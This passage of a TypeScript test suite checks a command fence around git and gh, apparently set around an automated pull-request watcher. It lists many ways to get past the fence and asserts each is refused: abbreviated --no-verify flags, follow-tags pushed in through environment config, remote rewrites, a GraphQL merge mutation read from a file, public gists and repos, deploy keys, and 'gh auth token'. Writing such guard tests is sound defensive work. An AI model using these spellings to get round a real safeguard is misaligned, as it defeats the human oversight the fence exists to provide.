			const make = ["-R", "o/r", "--title", "t", "--body", "b"];
			for (const args of [
				...["0", "f", "F", "false", "False", "FALSE", "bogus", ""].map(v => ["pr", "create", `--draft=${v}`, ...make]),
				...["false", "0", "f"].map(v => ["pr", "create", `-d=${v}`, ...make]),
				["pr", "create", "--draft", "--draft=false", ...make], ["pr", "create", "-d", "-d=0", ...make], ["pr", "create", "--draft", "-d=f", ...make], ["pr", "create", ...make, "--draft=0", "--draft=F"],
				// A value flag reads the next word as its value, a dash or not: none of these is a --draft.
				["pr", "create", "-tdraft", "--body", "b"], ["pr", "create", "-t", "--draft", "--body", "b"], ["pr", "create", "--title", "--draft", "--body", "b"], ["pr", "create", "-b", "--draft", "--title", "t"],
				["pr", "create", "--title=t", "--body", "--draft"], ["pr", "create", "-Bd", ...make], ["pr", "create", "-rd", ...make], ["pr", "create", "-fl", "d", ...make],
				["pr", "create", ...make], ["pr", "create", "--draft", "--no-such-flag", ...make],
			]) refuseGh(...args);
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			const allowed = [
				...["", "=true", "=1", "=t", "=T", "=TRUE", "=True"].map(v => ["pr", "create", `--draft${v}`, ...make]),
				["pr", "create", "-d", ...make], ["pr", "create", "-d=true", ...make], ["pr", "create", "--draft=false", "--draft", ...make], ["pr", "create", "-d=0", "-d", ...make], ["pr", "create", "-fd", "-R", "o/r"], ["pr", "create", "-d", "-f", "-R", "o/r"],
				["pr", "create", "--repo", "o/r", "--draft", "--head", "b", ...make], ["-R", "o/r", "pr", "create", "--draft", "--fill"], ["pr", "create", "-tx", "-b", "y", "-B", "main", "-d", "-R", "o/r"], ["pr", "create", "--title", "--draft", "--draft", "--body", "b", "-R", "o/r"],
			];
			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
			expect(ran()).toHaveLength(allowed.length);
		}, 30_000);

		test("a GraphQL query read from a file is refused whichever way the flag is spelled, and a thread may still be resolved", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			// A thread is placed by asking GitHub, which the stub answers: the watched pull request holds it.
			stubGh(`case "$*" in *graphql*) echo '{"data":{"node":{"pullRequest":{"number":5,"repository":{"name":"r","owner":{"login":"o"}}}}}}';; esac`);
			const file = path.join(privateHome(), "q.gql");
			write(file, 'mutation { mergePullRequest(input:{pullRequestId:"x"}) { clientMutationId } }');
			for (const args of [
				["api", "graphql", `-Fquery=@${file}`], ["api", "graphql", `--field=query=@${file}`], ["api", "graphql", "-F", `query=@${file}`], ["api", "graphql", "--field", `query=@${file}`], ["api", "graphql", "-F", "query=@-"],
				["api", "graphql", `-F=query=@${file}`], ["api", "graphql", "--input", file], ["api", "graphql", '-fquery=mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}'],
				["api", "graphql", '--raw-field=query=mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}'],
			]) refuseGh(...args);
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			const resolve = "mutation($t:ID!){resolveReviewThread(input:{threadId:$t}){thread{isResolved}}}";
			for (const args of [["api", "graphql", "-f", `query=${resolve}`, "-f", "t=X"], ["api", "graphql", `-fquery=${resolve}`, "-ft=X"], ["api", "graphql", "--raw-field", `query=${resolve}`, "-F", "t=X"]]) {
				expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
			}
			// Each resolve is two gh runs: the question about the thread, and the call.
			expect(ran()).toHaveLength(6);
		}, 30_000);

		test("a comment is the last --body or -b gh is given, so the first one can't stand in for it", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR7 });
			stubGh();
			const good = `${marker}\nFixed the failing test.`;
			for (const args of [
				["pr", "comment", "7", "-b", good, "--body", "see https://evil.example"], ["pr", "comment", "7", "--body", good, "-b", "no marker"], ["pr", "comment", "7", `--body=${good}`, "--body=@someone"],
				["pr", "comment", "7", "-b=no marker"], ["issue", "comment", "7", "-b", good, "-b", "fixes #3"],
			]) refuseGh(...args);
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			const allowed = [["pr", "comment", "7", "-R", "o/r", "--body", "no marker", "-b", good], ["pr", "comment", "7", "-R", "o/r", `--body=${good}`], ["pr", "comment", "7", "-R", "o/r", `-b=${good}`], ["issue", "comment", "7", "-b", good, "-R", "o/r"]];
			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
			expect(ghRuns()).toBe(allowed.length);
		}, 30_000);

		test("git -C takes the next word as the folder, a folder named -c included, and --attr-source and --shallow-file take theirs: the push is judged as the push it is", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			fs.symlinkSync(".", path.join(repo, "-c"));
			const evil = evilWorkflow();
			refuse(process.env, repo, "-C", "-c", "push", "origin", BRANCH);
			refuse(process.env, repo, "-C", "./", "-C", "-c", "push", "origin", BRANCH);
			// A word that is another option's value is not the subcommand: here `status` is a value and `push` runs.
			refuse(process.env, repo, "--attr-source", "status", "push", "origin", "HEAD:refs/heads/other");
			refuse(process.env, repo, "--attr-source=status", "push", "origin", "HEAD:refs/heads/other");
			refuse(process.env, repo, "--shallow-file", "status", "push", "--force", "origin", BRANCH);
			refuse(process.env, repo, "--shallow-file", "log", "push", "origin", "HEAD:refs/heads/other");
			refuse(process.env, repo, "--no-such-option", "push", "origin", BRANCH);
			expect(holes).toEqual([]);
			expect(originHas(BRANCH)).toBe("");
			expect(originHas("other")).toBe("");
			expect(sh(repo, "rev-parse", "HEAD").trim()).toBe(evil);
			// Options that take no word, and the ones that do, still lead to the command. (--attr-source is git 2.40's.)
			const attrSource = spawnSync("git", ["--attr-source", "HEAD", "version"], { env: { ...process.env, PATH: savedPath } }).status === 0;
			for (const args of [["--no-pager", "log", "-1"], ["--no-optional-locks", "status", "-s"], ["-P", "log", "-1"], ["-C", "src", "-c", "color.ui=never", "--no-pager", "status", "-s"], ...(attrSource ? [["--attr-source", "HEAD", "status", "-s"]] : []), ["--shallow-file", "x", "status", "-s"]]) {
				const r = git(process.env, ...args);
				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
				expect(r.status, args.join(" ")).toBe(0);
			}
		}, 30_000);

		test("a push that would also send a tag is refused, however git came to follow tags; --no-follow-tags sends the branch alone", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			// The user's own setting, written outside the fence, and an annotated tag the push would carry along.
			sh(repo, "config", "push.followTags", "true");
			sh(repo, "tag", "-a", "v9.9.9", "-m", "release");
			const tags = () => spawnSync("git", ["--git-dir", bare(), "for-each-ref", "--format=%(refname)", "refs/tags"], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout.trim();
			const push = git(process.env, "push", "origin", BRANCH);
			expect(push.status).toBe(1);
			expect(push.stderr).toContain("refs/tags/v9.9.9");
			expect(push.stderr).toContain("--no-follow-tags");
			expect(tags()).toBe("");
			expect(originHas(BRANCH)).toBe("");
			// The settings that do the same are refused where they are set, or for one push.
			refuse(process.env, repo, "config", "push.followTags", "true");
			refuse(process.env, repo, "config", "--add", "push.followTags", "true");
			refuse(process.env, repo, "config", "set", "push.followTags", "true");
			refuse(process.env, repo, "config", "--global", "push.followTags", "true");
			refuse(process.env, repo, "-c", "push.followTags=true", "push", "origin", BRANCH);
			refuse({ ...process.env, GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "push.followTags", GIT_CONFIG_VALUE_0: "true" }, repo, "push", "origin", BRANCH);
			refuse({ ...process.env, GIT_CONFIG_PARAMETERS: "'push.followTags'='true'" }, repo, "push", "origin", BRANCH);
			refuse({ ...process.env, TAG_ON: "true" }, repo, "--config-env=push.followTags=TAG_ON", "push", "origin", BRANCH);
			// A tag or another ref named on the line was refused already.
			refuse(process.env, repo, "push", "origin", "v9.9.9");
			refuse(process.env, repo, "push", "origin", `${BRANCH}:refs/tags/v1`);
			expect(holes).toEqual([]);
			expect(tags()).toBe("");
			expect(originHas(BRANCH)).toBe("");
			// The branch alone goes; so does a push where a lightweight tag, which --follow-tags leaves, is the only other thing there.
			expect(git(process.env, "push", "--quiet", "--no-follow-tags", "origin", BRANCH).status).toBe(0);
			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
			expect(tags()).toBe("");
			sh(repo, "tag", "-d", "v9.9.9");
			sh(repo, "tag", "v-light");
			write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
			sh(repo, "commit", "--quiet", "-am", "next");
			expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
			expect(tags()).toBe("");
		}, 30_000);

		test("git remote's subcommand follows its options: -v and --verbose in front change nothing", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			const url = (): string => sh(repo, "config", "--get", "remote.origin.url").trim();
			const was = url();
			const other = path.join(privateHome(), "other.git");
			for (const args of [
				["remote", "-v", "set-url", "origin", other], ["remote", "--verbose", "set-url", "origin", other], ["remote", "-v", "add", "evil", other], ["remote", "--verbose", "rename", "origin", "gone"],
				["remote", "-v", "remove", "origin"], ["remote", "-v", "rm", "origin"], ["remote", "-vv", "set-url", "origin", other], ["remote", "--verb", "set-url", "origin", other], ["remote", "--", "set-url", "origin", other],
				["remote", "-v", "set-url", "--push", "origin", other],
			]) refuse(process.env, repo, ...args);
			expect(holes).toEqual([]);
			expect(url()).toBe(was);
			expect(sh(repo, "remote").trim()).toBe("origin");
			for (const args of [["remote"], ["remote", "-v"], ["remote", "--verbose"], ["remote", "-v", "show", "origin"], ["remote", "get-url", "origin"], ["remote", "-v", "update"], ["remote", "set-head", "origin", "--auto"]]) {
				const r = git(process.env, ...args);
				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
				expect(r.status, args.join(" ")).toBe(0);
			}
		}, 30_000);

		test("--no-verify is refused in every spelling git reads for it, on commit, merge and pull, and a message that holds an n is not -n", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			sh(repo, "switch", "--quiet", "-c", "side");
			write(path.join(repo, "src/side.ts"), "export const side = 1;\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "side work");
			sh(repo, "switch", "--quiet", BRANCH);
			write(path.join(repo, "src/main.ts"), "export const main = 1;\n");
			sh(repo, "add", "-A");
			sh(repo, "commit", "--quiet", "-m", "branch work");
			const hooks = path.join(repo, ".git", "hooks");
			const hook = (name: string, code: number): void => {
				write(path.join(hooks, name), `#!/bin/sh\nexit ${code}\n`);
				fs.chmodSync(path.join(hooks, name), 0o755);
			};
			hook("pre-commit", 1);
			hook("pre-merge-commit", 1);
			const head = (): string => sh(repo, "rev-parse", "HEAD").trim();
			const before = head();
			for (const args of [
				["commit", "--allow-empty", "-m", "x", "--no-verify"], ["commit", "--allow-empty", "-m", "x", "--no-verif"], ["commit", "--allow-empty", "-m", "x", "--no-veri"], ["commit", "--allow-empty", "--no-veri", "-m", "x"],
				["commit", "--allow-empty", "-nm", "x"], ["commit", "--allow-empty", "-n", "-m", "x"], ["commit", "-anm", "x"], ["commit", "--allow-empty", "-mx", "-n"], ["commit", "--allow-empty", "-m", "x", "-sn"],
				["merge", "--no-ff", "--no-edit", "--no-verify", "side"],
				["pull", "--no-rebase", "--no-ff", "--no-edit", "--no-verify", ".", "side"], ["pull", "--no-rebase", "--no-ff", "--no-edit", "--no-verif", ".", "side"], ["pull", "--no-rebase", "--no-ff", "--no-edit", "--no-veri", ".", "side"],
			]) refuse(process.env, repo, ...args);
			expect(holes).toEqual([]);
			expect(head()).toBe(before);
			expect(fs.existsSync(path.join(repo, ".git", "MERGE_HEAD"))).toBe(false);
			// Without the flag the hooks run and stop the commit and the merge: git's own refusal, not the fence's.
			const plain = git(process.env, "commit", "--allow-empty", "-m", "x");
			expect(plain.status).toBe(1);
			expect(plain.stderr).not.toContain("ship fence");
			const merge = git(process.env, "merge", "--no-ff", "--no-edit", "side");
			expect(merge.status).toBe(1);
			expect(merge.stderr).not.toContain("ship fence");
			sh(repo, "merge", "--abort");
			expect(head()).toBe(before);
			// A message or a file that holds an n is no -n, and a message that is the flag's own name is only a message.
			hook("pre-commit", 0);
			for (const args of [["commit", "--allow-empty", "-mnew"], ["commit", "--allow-empty", "-m", "--no-verify"], ["commit", "--allow-empty", "-m", "-n"], ["commit", "--allow-empty", "--message=--no-verify"], ["commit", "--allow-empty", "-am", "n"], ["commit", "--allow-empty", "-Fsrc/a.ts"], ["commit", "--allow-empty", "--author=Name <n@x.y>", "-m", "x"]]) {
				const r = git(process.env, ...args);
				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
				expect(r.status, `${args.join(" ")}: ${r.stderr}`).toBe(0);
			}
		}, 30_000);

		test("gh runs only what a watch needs: the commands that got past the list of refused ones, and gh's other names for them, are refused and send nothing", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR });
			stubGh();
			const make = ["--title", "t", "--body", "b", "-R", "o/r", "--head", "o:feat", "--base", "main"];
			for (const args of [
				// `gh pr new` is `gh pr create`: a ready PR when it isn't a draft. `gh issue close` closes a PR by its number.
				["pr", "new", ...make], ["pr", "new", ...make, "--draft=false"], ["pr", "-R", "o/r", "new", ...make], ["issue", "close", "5", "-R", "o/r"], ["issue", "reopen", "6", "-R", "o/r"],
				["pr", "revert", "7", "-R", "o/r"], ["pr", "update-branch", "8", "-R", "o/r"], ["repo", "deploy-key", "add", "k.pub", "--allow-write", "-R", "o/r"], ["repo", "create", "evil-repo", "--public"], ["repo", "new", "evil-repo", "--public"],
				["label", "create", "bug"], ["gist", "create", "--public", "notes.txt"], ["gist", "new", "notes.txt"], ["issue", "develop", "9", "-b", "main", "--name", "x"], ["auth", "token", "-u", "blindx-tony-do"],
				// The rest of the groups, by their short names too.
				["pr", "co", "5"], ["co", "5"], ["issue", "new", "--title", "t"], ["release", "new", "v1"], ["repo", "ls"], ["secret", "list"], ["ext", "install", "x/y"], ["cs", "ls"], ["rs", "ls"], ["config", "get", "editor"], ["browse", "-n"],
			]) refuseGh(...args);
			expect(holes).toEqual([]);
			expect(ran()).toEqual([]);
			const allowed = [
				["pr", "new", "--draft", ...make], ["pr", "ls"], ["run", "ls"], ["issue", "ls"], ["run", "watch", "123"], ["workflow", "list"], ["workflow", "view", "ci.yml"], ["release", "list"], ["release", "view"], ["label", "list"], ["cache", "list"],
				["search", "prs", "x"], ["status"], ["version"], ["help", "pr"],
			];
			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
			expect(ghRuns()).toBe(allowed.length);
		}, 30_000);

		test("the same shims still run what was always allowed", () => {
			armFence({ pushBranch: BRANCH, root: repo, pr: PR7 });
			stubGh();
			const allowed = [
				["pr", "view", "7"], ["pr", "checks", "7"], ["pr", "comment", "7", "-R", "o/r", "--body", `${marker}\nDone.`], ["api", "repos/o/r/pulls/7/comments"], ["api", "repos/o/r/issues/7/comments", "-f", `body=${marker}\nDone.`],
				["api", "-X", "POST", "repos/o/r/pulls/7/comments/9/replies", "-f", `body=${marker}\nDone.`], ["api", "--method", "POST", "repos/o/r/pulls/7/requested_reviewers", "-f", "reviewers[]=x"], ["api", "--method", "GET", "repos/o/r/pulls/7"],
				["api", "repos/o/r/collaborators/x/permission", "--jq", ".permission"], ["api", "user", "--jq", ".login"], ["api", "graphql", "-f", 'query=query($o:String!){repository(owner:$o,name:"r"){id}}', "-f", "o=x", "-F", "number=7"],
				["pr", "view", "7", "--json", "state", "-R", "o/r"], ["pr", "list", "--repo", "o/r", "--head", BRANCH, "--state", "open", "--json", "number,url"], ["pr", "create", "--repo", "o/r", "--draft", "--head", BRANCH, "--title", "t", "--body", "b"],
			];
			for (const args of allowed) expect(runGh(...args).stderr, args.join(" ")).not.toContain("ship fence");
			expect(ghRuns()).toBe(allowed.length);
			for (const args of [["log", "-1", "--oneline"], ["show", "HEAD", "--stat"], ["diff", "--stat"], ["blame", "src/a.ts"], ["status", "-s"], ["fetch", "origin"], ["merge", "--no-edit", "origin/main"], ["commit", "--allow-empty", "-m", "x"], ["push", "origin", BRANCH]]) {
				const r = git(process.env, ...args);
				expect(r.stderr, args.join(" ")).not.toContain("ship fence");
				expect(r.status, `${args.join(" ")}: ${r.stderr}`).toBe(0);
			}
			expect(originHas(BRANCH)).toBe(sh(repo, "rev-parse", "HEAD").trim());
		}, 30_000);
	});
});
